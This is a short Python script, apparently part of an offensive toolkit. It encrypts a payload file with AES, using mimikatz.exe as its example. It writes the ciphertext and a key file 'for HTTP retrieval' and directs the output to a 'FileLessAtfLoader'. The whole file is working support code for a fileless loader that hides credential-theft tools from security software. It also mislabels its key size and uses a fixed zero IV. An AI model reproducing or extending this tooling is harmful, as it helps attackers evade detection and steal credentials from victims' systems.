#!/usr/bin/env python3
import sys
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

def AESencrypt(plaintext, key):
    """
    Encrypt a payload with AES-256-CBC
    """
    k = hashlib.sha256(key).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext, key
  
def dropFile(key, ciphertext):
    """
    Save the encrypted files
    """
    # Save the encrypted payload
    with open("cipher.bin", "wb") as fc:
        fc.write(ciphertext)
    
    # Save the key (for HTTP retrieval)
    with open("key.bin", "wb") as fk:
        fk.write(key)
    
    print(f"[+] Generated files:")
    print(f"    - cipher.bin ({len(ciphertext)} bytes)")
    print(f"    - key.bin ({len(key)} bytes)")
    
    # Display C++ arrays for debug (optional)
    print(f"\n[+] AES Key (C++ format):")
    print('unsigned char aes_key[] = { 0x' + ', 0x'.join(f'{x:02x}' for x in key) + ' };')
 
def main():
    if len(sys.argv) != 2:
        print("Usage: python3 aes.py <PAYLOAD_FILE>")
        print("Example: python3 aes.py mimikatz.exe")
        sys.exit(1)
    
    payload_file = sys.argv[1]
    
    # Check if the file exists
    if not os.path.exists(payload_file):
        print(f"[-] Error: The file '{payload_file}' does not exist")
        sys.exit(1)
    
    try:
        # Read the payload
        with open(payload_file, "rb") as f:
            content = f.read()
        
        print(f"[+] Payload read: {len(content)} bytes")
        
        # Generate a random 16-byte key (AES-128)
        KEY = get_random_bytes(16)
        print("[+] AES key generated")
        
        # Encrypt with AES
        ciphertext, key = AESencrypt(content, KEY)
        print("[+] Payload encrypted with AES-256-CBC")
        
        # Save the files
        dropFile(KEY, ciphertext)
        
        print("\n[+] AES encryption completed successfully!")
        print("[+] Use 'AES' as cipher parameter in your FileLessAtfLoader")
        
    except Exception as e:
        print(f"[-] Error during encryption: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()

